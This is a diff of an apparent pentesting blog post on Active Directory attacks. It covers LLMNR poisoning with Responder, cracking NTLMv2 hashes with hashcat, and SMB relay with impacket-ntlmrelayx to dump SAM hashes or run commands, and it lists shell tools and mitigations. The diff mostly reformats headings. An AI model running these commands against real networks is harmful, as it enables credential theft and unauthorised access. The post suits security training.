@@ -6,9 +6,9 @@ tags: [Active Directory, AD]
 author: barabulkit
 ---
 
-# LLMNR Poisoning (Responder)
+## LLMNR Poisoning (Responder)
 
-## Attack
+### Attack
 
 ```shell
 responder -I eth0 -wdv
@@ -26,21 +26,21 @@ hashcat -m 5600 hash.txt rockyou.txt -O
 and will get cracked password
 ![cracked](/assets/img/acd/cracked.png)
 
-## Mitigation
+### Mitigation
 
  - Disable LLMNR (in `Group Policy Editor` Local Computer Policy - Computer Configureation - Administrative Templates - Network - DNS Client - `Turn off Multicast name resolution`)
  - Disable NBT-NS (Network Connections - Network Adapter Properties = TCP/IPv4 Properties - Advanced tab - Wins tab - `Disable NetBIOS over TCP/IP`)
 
-# SMB Relay
+## SMB Relay
 
 Instead of cracking hashes gathered with `Responder`, we can relay them to specific machines and potentially gain access
 
-## Requirments
+### Requirments
 
  - SMB signing disabled on target
  - Relayed user creds must be admin on machine
 
-## Attack
+### Attack
 
 First step is to identify targets without SMB signing
 
@@ -67,7 +67,9 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 and after receiveng connection we will get SAM hashes
 ![hashes](/assets/img/acd/hashes.png)
 
-we can also use 
+### Gaining shell
+
+We can use 
 ```
 impacket-ntlmrelayx -tf targets.txt -smb2support -i
 ```
@@ -80,3 +82,15 @@ to execute test.exe on target machine, or
 impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
 to execute windows cmd command, or powershell oneliner with reverse tcp.
+
+#### Another tools for shell gain
+
+ - metasploit psexec
+ - psexec.py
+ - smbexec.py
+ - wmiexec.py
+
+### Mitigation
+
+ - Enable SMB signing
+ - Disable NTLM auth
